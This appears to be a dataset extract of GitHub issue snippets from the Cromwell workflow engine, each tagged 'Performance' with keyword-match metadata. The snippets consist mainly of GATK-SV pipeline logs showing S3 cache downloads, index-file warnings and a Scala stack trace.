s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi; 1608597021127,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:21895,cache,cacheCopy,21895,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-82/cacheCopy/SR00c.HG03472.txt.gz.tbi; 1608597338143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz; 1608597340856,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz; 1608597343594,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:109149,cache,cacheCopy,109149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-94/cacheCopy/SR00c.HG03789.txt.gz.tbi; 1608596949182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-71/cacheCopy/SR00c.HG02953.txt.gz; 1608596952115,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz; 1608596954593,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:3183,cache,cacheCopy,3183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi; 1608596976528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz; 1608596979652,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz; 1608596981096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:11296,cache,cacheCopy,11296,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz; 1608597651470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi; 1608597651575,*** COMPLETED LOCALIZATION ***; 1608597657265,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597658212,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi; 1608597660320,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:198070,cache,cacheCopy,198070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,77 predates the potentially-problematic December 17 release of 79 [0]. The first report of localization hanging reached us on December 22. [0] https://cloud.google.com/container-optimized-os/docs/release-notes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5390:178,optimiz,optimized-os,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5390,2,['optimiz'],['optimized-os']
Performance,"8-06-06 16:18:47,223 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-06 16:18:47,229 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(948bf608)]: Parsing workflow as WDL draft-2; 2018-06-06 16:18:47,232 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - WorkflowManagerActor Workflow 948bf608-f91b-46a7-b892-86454be067fd failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2088,concurren,concurrent,2088,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance,"83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-11-21 15:09:05,58] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 15:09:10,76] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: echo 'Hello World!' > ""helloWorld.txt""; [2018-11-21 15:09:10,80] [info] Submitting job to AWS Batch; [2018-11-21 15:09:10,80] [info] dockerImage: ubuntu:latest; [2018-11-21 15:09:10,80] [info] jobQueueArn: arn:aws:batch:us-east-1:267795504649:job-queue/GenomicsHighPriorityQue-ae4256f76f07d96; [2018-11-21 15:09:10,80] [info] taskId: test.hello-None-1; [2018-11-21 15:09:10,80] [info] hostpath root: test/hello/02306258-436a-4372-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3f23e1f07040; [2018-11-21 15:09:14,62] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:3200,queue,queue,3200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['queue'],['queue']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz.tbi; 1608597542416,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi; 1608597544559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi; 1608597545740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:168658,cache,cacheCopy,168658,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi; 1608597470124,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi; 1608597472441,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz; 1608597473978,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:146597,cache,cacheCopy,146597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi; 1608597394986,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz.tbi; 1608597397902,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz; 1608597399545,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:124750,cache,cacheCopy,124750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"86c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi; 1608597492748,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi; 1608597495158,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz.tbi; 1608597497211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:154059,cache,cacheCopy,154059,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
